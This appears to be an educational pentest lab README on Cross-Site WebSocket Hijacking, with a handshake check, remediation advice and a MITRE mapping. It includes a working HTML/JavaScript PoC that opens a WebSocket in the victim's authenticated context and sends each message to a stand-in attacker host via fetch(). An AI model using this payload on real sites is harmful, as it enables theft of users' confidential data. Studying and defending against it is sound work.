> **English** | [Italiano](README.md)

# WebSocket hijacking (CSWSH)

> - **Phase:** Web exploitation - OWASP A01:2021 Broken Access Control
> - **Visibility:** Low - the connection originates from the victim's browser and looks legitimate server-side
> - **Prerequisites:** a WebSocket endpoint whose authentication relies only on the session cookie, with no `Origin` header validation nor anti-CSRF token in the handshake
> - **Nature of the document:** methodology + practical PoC for a lab environment. No fabricated Finding ID (next `WEB-016`, to assign in lab).

- Objective: open, from an attacker site, a cross-site WebSocket connection toward the target using the victim's cookies, to read/send messages as them (data theft, actions).

---

## Executive summary

Cross-Site WebSocket Hijacking (CSWSH) is the "CSRF of WebSockets": the WebSocket handshake is an HTTP request
to which the browser automatically attaches cookies. If the server authenticates the connection based only on
the cookie and does not validate the `Origin` header nor use an anti-CSRF token, an attacker page can open a WS
connection to the target in the victim's authenticated context and exchange messages: read confidential data
(chat history, notifications, state) or send commands. Typical severity `High`.

## Execution / commands

### Phase 1 - handshake check

```bash
# Observe the handshake: if there is no Origin validation nor token, it is a CSWSH candidate
curl -s -I https://target.lab/ws -H "Origin: https://evil.lab" \
  -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ=="
# 101 Switching Protocols response with an arbitrary Origin -> Origin not validated
```

### Phase 2 - PoC (attacker page)

```html
<script>
// the victim's browser attaches the cookies: WS connection in their authenticated context
const ws = new WebSocket('wss://target.lab/ws');
ws.onopen = () => ws.send('{"action":"getHistory"}');          // send commands as the victim
ws.onmessage = e => fetch('https://evil.lab/collect?d=' + encodeURIComponent(e.data)); // exfiltrate the responses
</script>
```

Illustrative output (on the attacker's server):

```
GET /collect?d=%7B%22messages%22%3A%5B...%5D%7D   <-- victim's confidential messages/data exfiltrated
```

## Analysis of results

A handshake accepted with an arbitrary `Origin` and a readable message flow confirm CSWSH: the impact ranges
from data theft (`High`) to execution of sensitive actions over WS. If the server validates the `Origin` with an
allowlist and/or uses a per-session token in the handshake, the vector is closed.

### Theoretical analysis

Like CSRF, CSWSH exploits ambient authority (automatically attached cookies), extended to the persistent
WebSocket channel. The Same-Origin Policy does not protect the WS handshake. The countermeasure is not to trust
the cookie alone: validate the `Origin` against an allowlist and include a per-session anti-CSRF token in the
handshake.

## Remediation (blue team)

**Detection.** WS handshakes with external `Origin` accepted; WS connections from unexpected referers.

**Hardening.** Validate the `Origin` header (allowlist) in the handshake; per-session anti-CSRF token; do not
base channel authorization on the cookie alone; `SameSite` on cookies.

## Reference tools

| tool | type | technique/access | main use case |
| :--- | :--- | :--- | :--- |
| `Burp Suite` | proxy/scanner | web - active | intercepts the ws handshake and messages; tests origin validation |
| `websocat` | ws client | cli - active | manual connection to the ws endpoint and message sending |

## MITRE ATT&CK mapping

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| initial access | exploit public-facing application | `T1190` | abuse of a websocket endpoint lacking origin/token validation. |
| credential access | steal web session cookie | `T1539` | use of the victim's session context to open the ws connection. |

---

## Links to other findings

| source | this technique | effect |
| :--- | :--- | :--- |
| [csrf](<../csrf (Cross-Site Request Forgery)/README.en.md>) | websocket hijacking | same root (ambient cookie), applied to the websocket channel |
| websocket hijacking | [secure-coding-lab](<../../06-secure-coding-lab (Defense)/README.en.md>) | the remediation (origin validation, token) links to secure coding |

---

> **Note:** Educational content. The PoCs must be used only on owned applications or with explicit authorization, in a lab. Illustrative outputs.
